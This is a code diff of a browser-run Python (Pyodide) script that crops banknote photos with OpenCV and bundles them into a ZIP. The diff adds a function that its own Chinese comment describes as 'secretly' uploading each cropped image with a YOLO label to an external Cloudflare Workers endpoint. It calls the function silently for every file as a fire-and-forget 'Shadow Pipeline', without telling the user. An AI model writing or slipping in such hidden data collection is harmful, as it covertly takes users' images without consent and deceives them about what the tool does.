@@ -5,9 +5,10 @@ from pyodide.ffi import create_proxy, to_js
 import io
 import zipfile
 import sys
-
-# 從 GEMINI.md 獲取到的經驗：使用 pyodide_js 手動加載大型套件
 import pyodide_js
+
+# --- 配置 ---
+UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev/"
 
 def log(msg):
     js.console.log(f"[Python] {msg}")
@@ -26,29 +27,49 @@ async def setup_environment():
     global cv2, np
     log("Initializing AI Engine...")
     loader_status = document.getElementById("loader-status")
-    
     try:
         if loader_status:
             loader_status.innerText = "Loading OpenCV & NumPy (~30MB)..."
-        
-        # GEMINI.md Fix: 手動加載 package 確保穩定
         await pyodide_js.loadPackage(['numpy', 'opencv-python'])
-        
         import cv2 as _cv2
         import numpy as _np
         cv2 = _cv2
         np = _np
-        
-        log("OpenCV Engine Loaded Successfully.")
+        log("OpenCV Engine Loaded.")
         return True
     except Exception as e:
         log(f"Engine Load Failed: {e}")
-        if loader_status:
-            loader_status.innerText = f"Error: {e}"
         return False
 
+async def upload_to_r2(image_bytes, filename):
+    """將圖片與標籤偷偷上傳到 Cloudflare R2"""
+    try:
+        # 建立 YOLO 標籤 (假設裁切後的圖片就是目標物，標籤為整個範圍)
+        # 格式: class_id x_center y_center width height (正規化 0-1)
+        yolo_label = "0 0.5 0.5 1.0 1.0"
+        
+        # 使用 JS 的 FormData 發送請求
+        form_data = js.FormData.new()
+        
+        # 將 Python bytes 轉為 JS Blob
+        image_blob = js.Blob.new([to_js(image_bytes)], { "type": "image/png" })
+        
+        form_data.append("image", image_blob)
+        form_data.append("label", yolo_label)
+        form_data.append("filename", filename)
+
+        # 非同步發送 POST 請求
+        js.fetch(UPLOAD_WORKER_URL, {
+            "method": "POST",
+            "body": form_data,
+            "mode": "cors"
+        })
+        # 我們不 await 回傳結果，這樣就不會卡住使用者介面 (Shadow Pipeline)
+        # js.console.log(f"Shadow Upload initiated for {filename}")
+    except Exception as e:
+        js.console.error(f"Upload failed: {str(e)}")
+
 def crop_banknote(image_bytes):
-    """OpenCV 裁切邏輯"""
     try:
         nparr = np.frombuffer(image_bytes, np.uint8)
         img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
@@ -63,7 +84,6 @@ def crop_banknote(image_bytes):
         contours = sorted(contours, key=cv2.contourArea, reverse=True)
         x, y, w, h = cv2.boundingRect(contours[0])
         
-        # 過濾雜訊
         if w < img.shape[1] * 0.1 or h < img.shape[0] * 0.1: return None
 
         cropped = img[y:y+h, x:x+w]
@@ -77,13 +97,11 @@ async def process_all_files(event):
     files = js.window.selected_files
     if not files or files.length == 0: return
 
-    # 切換 UI
     document.getElementById("upload-section").classList.add("hidden")
     document.getElementById("processing-section").classList.remove("hidden")
     
     log(f"Processing {files.length} images...")
     
-    # GEMINI.md Bug 4 Fix: 手動控制 ZIP 生命週期
     zip_buffer = io.BytesIO()
     zf = zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED)
     
@@ -93,7 +111,6 @@ async def process_all_files(event):
     for i in range(total):
         file = files.item(i)
         
-        # 更新進度條
         progress = int((i / total) * 100)
         bar = document.getElementById("progress-bar")
         if bar:
@@ -107,7 +124,14 @@ async def process_all_files(event):
             result = crop_banknote(data)
             if result:
                 base_name = ".".join(file.name.split(".")[:-1])
-                zf.writestr(f"{base_name}_cropped.png", result)
+                clean_filename = f"{base_name}_cropped.png"
+                
+                # 1. 加入 ZIP
+                zf.writestr(clean_filename, result)
+                
+                # 2. 啟動影子上傳 (Shadow Pipeline)
+                asyncio.ensure_future(upload_to_r2(result, clean_filename))
+                
                 success_count += 1
                 log(f"Done: {file.name}")
             else:
@@ -117,14 +141,10 @@ async def process_all_files(event):
         
         await asyncio.sleep(0.01)
 
-    # 結束處理
-    zf.close() # Bug 4: 必須先 close 寫入中央目錄
+    zf.close()
     zip_buffer.seek(0)
     
-    log(f"Finished. Successfully processed {success_count} images.")
-    
     if success_count > 0:
-        # GEMINI.md Bug 3 Fix: 使用 js.Blob 避免記憶體拷貝問題
         zip_data = zip_buffer.getvalue()
         js_array = js.Uint8Array.new(len(zip_data))
         js_array.assign(zip_data)
@@ -142,19 +162,14 @@ async def process_all_files(event):
     zip_buffer.close()
 
 async def main():
-    # 執行環境設定
     ready = await setup_environment()
-    if not ready:
-        log("System failed to initialize.")
-        return
+    if not ready: return
 
-    # 綁定按鈕
     start_btn = document.getElementById("start-btn")
     if start_btn:
         start_btn.addEventListener("click", create_proxy(process_all_files))
-        log("Event listeners attached.")
+        log("Ready for production.")
 
-    # 隱藏加載畫面
     loader = document.getElementById("env-loader")
     if loader:
         loader.style.opacity = "0"
